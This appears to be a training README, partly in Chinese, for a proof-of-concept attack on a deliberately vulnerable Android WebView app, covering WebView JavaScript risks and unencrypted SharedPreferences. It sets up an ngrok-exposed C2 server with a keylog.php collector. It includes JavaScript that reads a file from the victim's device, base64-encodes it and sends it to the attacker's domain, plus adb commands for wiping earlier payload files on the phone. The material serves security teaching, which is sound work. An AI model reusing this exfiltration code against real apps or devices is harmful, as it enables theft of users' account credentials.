# Webview javascript enable POC 
# learnning object
1. Webview:javascript enable risk  
1. sharePreference not encrypt risk

## skill and tool need to know
- activity 20min 
  - 代表 app 的其中一個頁面
- content provider 20min 
  - 藉由 url 從 activity 呼叫另外一個 activity 
- intent 20min 
  - 開啟另外一個 activity ，同時可以指定需要傳輸資料
- webview 20min 
  - 在 app 內部開啟網頁連結，算是 app 內建的瀏覽器，功能比起 chrome 要少
- 下面直接實作的時候開始講解
  - javascript 20min 
    - 發出 Http 請求
  - adb 20min 
    - 連接設備
    - 開啟某個 app 的 activity
  - kotlin(講會用到的語法) 20min 
  - ngrok 30 min
    - 註冊及使用方式
  - chrome webview debug tool 20min 
    - finds out what's wrong with http request from vulnwebview to C2 server
  - tcp dump in testing android device ? 1hr
    - can observer network traffic, know what's going on
# environment set up
C2 server
- service
  - ngrok:mapping a port on your computer to an temporary domain that every where can connect to
  - php server:php buildin server
    -  php -s localhost:80
- file
  - keylog.php:write user account of vulnwebview app from a victim's phone
  - ngork.exe:set up ngrok service
    - ngork config add-authtoken $YOUR_AUTHTOKEN
    - ngork http 80
## code in Malware app need to change
>when every time you restart ngork and $YOUR_NGORK_TEMP_DOMAIN change. You need to execute following two step to make sure every is ok  
>if you don't want to do it every time, you can pay ngork to customize you domain name

1. fileAccess.html:need to change every time
```js
 xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        console.log("File loaded successfully:", xhr.responseText);
                        //debug
                        // var p = document.createElement("p");
                        // p.textContent = xhr.responseText;
                        // document.body.appendChild(p);
                        parseXML(xhr.responseText)

                        // --------------Here need to change !!!---------------------------------------
                         url='https://<$YOUR_NGORK_TEMP_DOMAIN>/keylog.php?key=' + btoa(xhr.responseText)
                        fetch(url, {
                            method: "GET",
                            headers: new Headers({
                                'ngrok-skip-browser-warning': 'true'
                            })
                        })
                    } else {
                        console.error("Failed to load file:", xhr.status, xhr.statusText);
                        var error = document.createElement("p");
                        error.textContent = "Error loading file: " + xhr.status;
                        document.body.appendChild(error);
                    }
                }
            };
```
2. need to ensure delete previous version of fileAccess.html on victim's phone
```
adb devices
adb shell //if have only one device, if not - >use -s to specify specific device
//connect to shell of emlator
cd sdcard/Document
rm *.html
```

